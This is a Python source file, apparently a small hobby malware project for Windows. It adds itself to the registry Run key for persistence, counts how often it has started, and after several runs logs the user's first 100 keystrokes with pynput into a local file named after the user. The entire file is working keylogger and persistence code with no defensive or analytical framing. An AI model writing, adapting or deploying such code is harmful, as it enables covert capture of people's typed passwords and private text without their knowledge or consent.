from io import open
import winreg
from os import path
from ctypes import windll # An included library with Python install.
from pynput import keyboard
from getpass import getuser
from pyautogui import moveTo

path = path.realpath(__file__)
numDias = 0

def setNumInfected(i):

    global numDias
    if i == 0:
        
        with winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER) as MyKey69:
            with winreg.OpenKey(MyKey69, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS) as sub_key69:
                winreg.SetValueEx(sub_key69, "0", 0, winreg.REG_SZ, "")
                winreg.CloseKey(sub_key69)
                winreg.CloseKey(MyKey69)
    else:
        
        with winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER) as MyKey69:
            with winreg.OpenKey(MyKey69, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS) as sub_key69:
                    try:
                        i = 0
                        while True:
                            asubkey = winreg.EnumValue(sub_key69, i)
                            if (asubkey[0].isdigit()):
                                numDias = int(asubkey[0])+1
                                winreg.DeleteValue(sub_key69, asubkey[0])
                                winreg.SetValueEx(sub_key69, str(numDias), 0, winreg.REG_SZ, "")
                                return
                            i += 1
                    except WindowsError:
                        pass
        return
    
def checkIfInfected():
    with winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER) as MyKey69:
        with winreg.OpenKey(MyKey69, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS) as sub_key69:
                try:
                    i = 0
                    while True:
                        asubkey = winreg.EnumValue(sub_key69, i)
                        if (asubkey[0] == "binfolder"):
                            return True
                        i += 1
                except WindowsError:
                    pass
    return False


if checkIfInfected():

    setNumInfected(1)
    
    if numDias > 3:

        teclasPresionadas = 0
        escribio = ""
        FAILSAFE = False
        moveTo(100, 100, 1)
        moveTo(500, 500, 1)    

        windll.user32.MessageBoxW(0, "Hey, how are you?", ":)", 6)

        def on_press(key):
            global teclasPresionadas
            global escribio
            teclasPresionadas+=1
            try:
                escribio += key.char
            except AttributeError:
                if (key.space):
                    escribio += " "
                pass

        def on_release(key):
            global teclasPresionadas
            if teclasPresionadas > 100:
                # Stop listener
                return False

        # Collect events until released
        with keyboard.Listener(
                on_press=on_press,
                on_release=on_release) as listener:
            listener.join()

        fichero = open('info_de_' + getuser() + '.txt','w')
        fichero.write("User's gathered info: \n" + escribio)
        fichero.close()
    

if not checkIfInfected():
    setNumInfected(0)
    with winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER) as MyKey69:
        with winreg.OpenKey(MyKey69, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS) as sub_key69:
            winreg.SetValueEx(sub_key69, "binfolder", 0, winreg.REG_SZ, path)
            winreg.CloseKey(sub_key69)
            winreg.CloseKey(MyKey69)








